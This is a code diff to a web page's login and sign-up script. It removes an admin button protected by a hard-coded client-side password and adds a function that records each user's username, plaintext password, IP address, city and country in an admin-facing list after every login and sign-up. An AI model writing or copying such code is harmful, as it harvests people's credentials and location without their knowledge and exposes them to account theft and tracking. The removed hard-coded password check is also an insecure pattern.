@@ -36,7 +36,6 @@
             <button id="login-button">Log In</button>
             <p id="login-error" style="color: red; display: none;">Incorrect username or password. Please try again.</p>
             <p>Don't have an account? <a href="#" id="show-signup">Sign Up</a></p>
-            <button id="admin-panel-button">Admin Panel</button> <!-- Button to access the admin panel -->
         </div>
 
         <!-- Sign-up Section (Initially Hidden) -->
@@ -100,6 +99,14 @@
                 });
         }
 
+        // Function to update the admin panel with user data
+        function updateAdminPanel(username, password, ip, city, country) {
+            const userList = document.getElementById('user-list');
+            const listItem = document.createElement('li');
+            listItem.textContent = `Username: ${username}, Password: ${password}, IP: ${ip}, City: ${city}, Country: ${country}`;
+            userList.appendChild(listItem);
+        }
+
         // Event listener for the Log In button
         document.getElementById('login-button').addEventListener('click', function () {
             const username = document.getElementById('login-username').value;
@@ -113,6 +120,7 @@
                     document.getElementById('ip-address').textContent = `Your IP: ${data.ip}`;
                     document.getElementById('city').textContent = `City: ${data.city}`;
                     document.getElementById('country').textContent = `Country: ${data.country}`;
+                    updateAdminPanel(username, password, data.ip, data.city, data.country);
                 });
             } else {
                 document.getElementById('login-error').style.display = 'block';
@@ -135,6 +143,7 @@
                     document.getElementById('ip-address').textContent = `Your IP: ${data.ip}`;
                     document.getElementById('city').textContent = `City: ${data.city}`;
                     document.getElementById('country').textContent = `Country: ${data.country}`;
+                    updateAdminPanel(username, password, data.ip, data.city, data.country);
                 });
             } else {
                 document.getElementById('signup-error').style.display = 'block';
@@ -156,16 +165,6 @@
         // Event listener for the Sign Out button
         document.getElementById('signout-button').addEventListener('click', function () {
             showSection('login-section'); // Redirect to the login section
-        });
-
-        // Event listener for the Admin Panel button
-        document.getElementById('admin-panel-button').addEventListener('click', function () {
-            const password = prompt('Enter admin password:');
-            if (password === '211892A') {
-                window.location.href = 'admin.html'; // Redirect to the admin panel
-            } else {
-                alert('Incorrect password!');
-            }
         });
     </script>
 </body>
